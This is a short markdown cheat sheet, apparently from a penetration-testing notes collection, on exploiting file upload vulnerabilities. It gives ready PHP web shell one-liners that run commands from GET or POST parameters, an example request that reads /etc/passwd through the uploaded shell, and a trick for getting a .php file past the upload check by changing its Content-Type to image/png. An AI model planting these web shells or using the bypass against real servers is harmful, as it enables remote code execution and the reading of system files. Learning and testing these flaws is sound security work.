# Upload Files

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution. 

## Table of Content

- [payload](#payload)
    - [php](#php)
- [bypass](#bye-pass)
    - [Content Type](#content-type)

## payload

### Php

This is a php payload of web shell (use the GET or POST)

```php
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
```

usage: 

`http://simple.net/images/exploit.php?cmd=cat /etc/passwd`

or use [burpsuite](/tools/burpsuite/README.md) to send POST method (ofc you also can send POST with other application like curl)

## Bye Pass

### Content type

When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is preferred.

So to bypass Content type, locate it in the request and modifie it: 

```
------WebKitFormBoundaryzbUn7VlDKBoeBHQv
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: /image/png
```

before: `application/php` -> after: `image/png`

### Documentation

- [portswigger](https://portswigger.net/web-security/file-upload)

---

[**:arrow_right_hook: Back home**](/README.md)